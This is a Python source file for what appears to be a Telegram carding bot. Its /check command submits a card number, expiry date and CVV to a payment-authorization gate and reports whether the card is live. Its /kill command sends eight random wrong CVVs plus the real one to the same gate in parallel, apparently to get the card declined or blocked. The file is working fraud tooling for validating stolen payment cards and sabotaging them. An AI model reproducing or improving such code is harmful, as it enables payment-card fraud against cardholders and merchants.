import asyncio
import random
from gates.authorize import authorize_check

async def kill_cmd(update, context):
    if not context.args:
        await update.message.reply_text("❌ Use: /kill card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("💀 Killing card (parallel, max 2 at a time)...")
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts = list(wrong) + [cvv]
    sem = asyncio.Semaphore(2)
    async def limited(c):
        async with sem:
            return await authorize_check(card, month, year, c)
    tasks = [limited(c) for c in attempts]
    results = await asyncio.gather(*tasks)
    report = "\n".join([f"CVV {c}: {status} - {msg}" for c, (status, msg, _) in zip(attempts, results)])
    await update.message.reply_text(f"✅ Done.\n\n{report}")

async def check_cmd(update, context):
    if not context.args:
        await update.message.reply_text("❌ Use: /check card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("🔍 Checking card...")
    status, msg, live = await authorize_check(card, month, year, cvv)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")